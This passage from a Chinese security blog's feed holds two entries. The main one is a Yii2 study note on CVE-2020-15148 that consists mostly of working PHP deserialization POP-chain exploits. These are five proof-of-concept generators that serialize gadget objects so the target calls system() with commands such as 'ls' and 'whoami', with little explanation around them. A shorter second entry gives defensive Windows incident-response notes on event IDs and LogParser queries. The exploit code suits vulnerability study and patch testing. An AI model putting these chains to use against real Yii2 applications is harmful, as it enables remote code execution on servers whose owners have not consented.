    <content type="html"><![CDATA[<p>yii学习 </p><a id="more"></a><h1 id="yii2"><a href="#yii2" class="headerlink" title="yii2"></a>yii2</h1><h2 id="CVE-2020-15148"><a href="#CVE-2020-15148" class="headerlink" title="CVE-2020-15148"></a>CVE-2020-15148</h2><p>影响yii2的2.0.37版本或其他更低版本<br>poc1-3 可看此文章<a href="https://juejin.cn/post/6874149010832097294" target="_blank" rel="noopener">https://juejin.cn/post/6874149010832097294</a></p><h3 id="poc1（CVE-2020-15148）"><a href="#poc1（CVE-2020-15148）" class="headerlink" title="poc1（CVE-2020-15148）"></a>poc1（CVE-2020-15148）</h3><p>利用<code>[(new test), &quot;aaa&quot;]</code>来调用任意test类的aaa方法，绕过了call_user_func参数不可控。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'system'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'ls'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'close'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'system'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'ls'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'isRunning'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'system'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'ls'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'render'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $keys = [];</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"axin"</span>=&gt;<span class="keyword">array</span>(<span class="string">"is"</span>=&gt;<span class="string">"handsome"</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="poc4"><a href="#poc4" class="headerlink" title="poc4"></a>poc4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">IndexAction</span> &#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> $id;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checkAccess=<span class="string">"system"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;id=<span class="string">"whoami"</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> </span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> $fields = [];</span><br><span class="line">            <span class="keyword">public</span> $writeCallback;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;writeCallback=[(<span class="keyword">new</span> IndexAction),<span class="string">"run"</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;fields[<span class="string">'1'</span>] = <span class="string">'aaa'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">DbSession</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> $_dataReader;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader=<span class="keyword">new</span> DbSession();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title">exp</span>=<span class="title">print</span>(<span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>())));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="other-poc"><a href="#other-poc" class="headerlink" title="other poc"></a>other poc</h3><p>可看此文章<br><a href="https://www.anquanke.com/post/id/217929" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217929</a>  </p><h2 id="新POP链"><a href="#新POP链" class="headerlink" title="新POP链"></a>新POP链</h2><p>yii2 version &lt;= 2.0.41(GitHub最新版本)</p><p><a href="https://xz.aliyun.com/t/9420" target="_blank" rel="noopener">https://xz.aliyun.com/t/9420</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span> ;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($argv)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $argv;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $generator;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command,$argv)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> DefaultGenerator($argv);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">99999999</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">ValidGenerator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes = [] ;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command,$argv)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[] = <span class="keyword">new</span> ValidGenerator($command,$argv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line">    $exp = <span class="keyword">new</span> RunProcess(<span class="string">'system'</span>,<span class="string">'whoami'</span>);</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize($exp)));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="YII2SQL注入分析"><a href="#YII2SQL注入分析" class="headerlink" title="YII2SQL注入分析"></a>YII2SQL注入分析</h1><p>影响版本： 小于v 2.0.15</p><p><a href="https://juejin.cn/post/6874149010832097294" target="_blank" rel="noopener">https://juejin.cn/post/6874149010832097294</a><br><a href="https://www.anquanke.com/post/id/217929" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217929</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;yii学习 &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="https://blog.cfyqy.com/article/587e8742.html"/>
    <id>https://blog.cfyqy.com/article/587e8742.html</id>
    <published>2021-05-25T04:29:54.000Z</published>
    <updated>2021-05-25T09:53:50.154Z</updated>
    
    <content type="html"><![CDATA[<p>应急响应知识点</p><a id="more"></a><h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br><span class="line">tasklist | findstr “PID”</span><br></pre></td></tr></table></figure><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>查看进程<br>（1）开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路 径、进程ID、文件创建日期、启动时间等<br>（2）使用Process Explorer 查看进程<br>（3）D盾查看进程<br>启动项分析<br>使用Autoruns进行启动项分析</p><h2 id="window日志"><a href="#window日志" class="headerlink" title="window日志"></a>window日志</h2><p>window日志分为系统日志，应用程序日志和安全日志。在应急溯源中，重点关注安全日志</p><p>系统日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT&#x2F;2000操作系统预先定义。</span><br><span class="line">默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure><p>应用程序日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p>安全日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>按 “Window+R”，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器” </p><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th>事件ID</th><th>说明</th></tr></thead><tbody><tr><td>4624</td><td>登录成功</td></tr><tr><td>4625</td><td>登录失败</td></tr><tr><td>4634</td><td>注销成功</td></tr><tr><td>4647</td><td>用户启动的注销</td></tr><tr><td>4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td>4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： </p><table><thead><tr><th>登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录</td></tr><tr><td>3</td><td>网络（Network）</td><td>常见的情况就是连接到共享文件夹或共享打印机时，如SMB爆破——蠕虫病毒</td></tr><tr><td>4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动</td></tr><tr><td>5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行</td></tr><tr><td>7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td>8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP</td></tr><tr><td>9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序</td></tr><tr><td>10</td><td>远程交互（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机，如RDP爆破——勒索病毒</td></tr><tr><td>11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p><strong>Log Parser</strong>    </p><p>工具下载：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br>查询登录成功的所有事件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  <span class="string">"SELECT *  FROM c:\Security.evtx where EventID=4624"</span></span><br></pre></td></tr></table></figure><p>查询登录成功，切登录类型为10的用户名和IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:datagrid <span class="string">"SELECT TimeGenerated,EXTRACT_TOKEN(Strings,8,'|') AS LoginType,EXTRACT_TOKEN(  Strings,5,'|') AS USERNAME,EXTRACT_TOKEN(Strings,17,'|') AS ProcessName,EXTRACT_TOKEN(Strings,18,'|') AS Client_IP FROM 'anquan.evtx' WHERE EventID='4624' AND  EXTRACT_TOKEN(Strings,18,'|') NOT LIKE '%-%' AND ( EXTRACT_TOKEN(Strings,8,'|')='10' or  EXTRACT_TOKEN(Strings,8,'|')='10') ORDER BY TimeGenerated DESC"</span></span><br></pre></td></tr></table></figure><p>提取登录成功的用户名和IP </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:datagrid <span class="string">"SELECT TimeGenerated,EXTRACT_TOKEN(Strings,8,'|') AS LoginType,EXTRACT_TOKEN(  Strings,5,'|') AS USERNAME,EXTRACT_TOKEN(Strings,17,'|') AS ProcessName,EXTRACT_TOKEN(Strings,18,'|') AS Client_IP FROM 'anquan.evtx' WHERE EventID='4624'</span></span><br></pre></td></tr></table></figure><p><strong>Event Log Explorer</strong><br>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/" target="_blank" rel="noopener">https://event-log-explorer.en.softonic.com/</a></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/8253" target="_blank" rel="noopener">https://xz.aliyun.com/t/8253</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;应急响应知识点&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP原生类利用</title>
    <link href="https://blog.cfyqy.com/article/511af9ea.html"/>
    <id>https://blog.cfyqy.com/article/511af9ea.html</id>
    <published>2021-05-11T15:15:45.000Z</published>
    <updated>2021-07-07T02:16:10.814Z</updated>
    
